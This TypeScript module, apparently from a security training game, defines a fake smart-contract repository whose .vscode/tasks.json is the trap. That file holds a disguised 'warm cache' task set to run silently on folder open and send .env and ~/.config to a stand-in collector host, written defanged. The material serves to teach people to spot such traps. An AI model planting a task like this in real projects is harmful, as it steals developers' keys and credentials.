// The fake repository the player inspects. File contents are literal code on purpose.
// The exfiltration command in .vscode/tasks.json is defanged and truncated: it cannot run.

export type RepoEntry = { name: string; hidden?: boolean; files?: string[] };

export const REPO_TREE: RepoEntry[] = [
  { name: ".github", hidden: true, files: ["workflows/ci.yml"] },
  { name: ".vscode", hidden: true, files: ["settings.json", "tasks.json"] },
  { name: "contracts", files: ["IStrategy.sol", "Vault.sol"] },
  { name: "scripts", files: ["fork-test.sh"] },
  { name: "src", files: ["index.ts"] },
  { name: "test", files: ["Vault.test.ts"] },
  { name: ".env", hidden: true },
  { name: ".env.example", hidden: true },
  { name: ".gitignore", hidden: true },
  { name: "README.md" },
  { name: "hardhat.config.ts" },
  { name: "package.json" },
];

export const TRAP_FILE = ".vscode/tasks.json";
export const README_FILE = "README.md";

export const REPO_FILES: Record<string, string> = {
  ".github/workflows/ci.yml": `name: ci
on: [push, pull_request]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
      - run: npm ci
      - run: npx hardhat test`,

  ".vscode/settings.json": `{
  "editor.formatOnSave": true,
  "editor.tabSize": 4,
  "search.exclude": { "**/artifacts": true, "**/cache": true }
}`,

  ".vscode/tasks.json": `{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "deps: warm cache",
      "type": "shell",
      "command": "tar czf - .env ~/.config … | curl -s -X POST hxxps://collector[.]example/u …",
      "runOptions": { "runOn": "folderOpen" },
      "presentation": { "reveal": "never", "echo": false }
    }
  ]
}`,

  "contracts/IStrategy.sol": `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IStrategy {
    function deposit(uint256 assets) external;
    function withdraw(uint256 assets) external returns (uint256);
    function totalAssets() external view returns (uint256);
}`,

  "contracts/Vault.sol": `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {ERC20, IERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Vault is ERC4626 {
    address public strategy;
    address public immutable governance;

    constructor(IERC20 asset_)
        ERC20("Quillmere Vault", "qvUSDC")
        ERC4626(asset_)
    {
        governance = msg.sender;
    }

    function setStrategy(address next) external {
        require(msg.sender == governance, "!gov");
        strategy = next;
    }
}`,

  "scripts/fork-test.sh": `#!/usr/bin/env bash
set -euo pipefail
source .env
npx hardhat test --network hardhat`,

  "src/index.ts": `import { ethers } from "ethers";

export async function vaultTvl(vault: string, rpcUrl: string) {
  const provider = new ethers.JsonRpcProvider(rpcUrl);
  const abi = ["function totalAssets() view returns (uint256)"];
  const contract = new ethers.Contract(vault, abi, provider);
  return contract.totalAssets();
}`,

  "test/Vault.test.ts": `import { expect } from "chai";
import { ethers } from "hardhat";

describe("Vault", () => {
  it("only governance can set the strategy", async () => {
    const [, stranger] = await ethers.getSigners();
    const vault = await ethers.deployContract("Vault", [ethers.ZeroAddress]);
    await expect(
      vault.connect(stranger).setStrategy(stranger.address)
    ).to.be.revertedWith("!gov");
  });
});`,

  ".env": `RPC_URL=https://rpc.example/v1/mainnet
DEPLOYER_PRIVATE_KEY=0x7f3a********************************************************c91e`,

  ".env.example": `RPC_URL=
DEPLOYER_PRIVATE_KEY=`,

  ".gitignore": `node_modules/
artifacts/
cache/
.env`,

  "hardhat.config.ts": `import "dotenv/config";
import { HardhatUserConfig } from "hardhat/config";

const config: HardhatUserConfig = {
  solidity: "0.8.24",
  networks: {
    mainnet: {
      url: process.env.RPC_URL ?? "",
      accounts: [process.env.DEPLOYER_PRIVATE_KEY ?? ""],
    },
  },
};

export default config;`,

  "package.json": `{
  "name": "vault-audit-task",
  "version": "0.3.1",
  "private": true,
  "scripts": {
    "compile": "hardhat compile",
    "test": "hardhat test",
    "fork-test": "bash scripts/fork-test.sh"
  },
  "devDependencies": {
    "@openzeppelin/contracts": "^5.0.2",
    "dotenv": "^16.4.5",
    "ethers": "^6.13.0",
    "hardhat": "^2.22.0"
  }
}`,
};
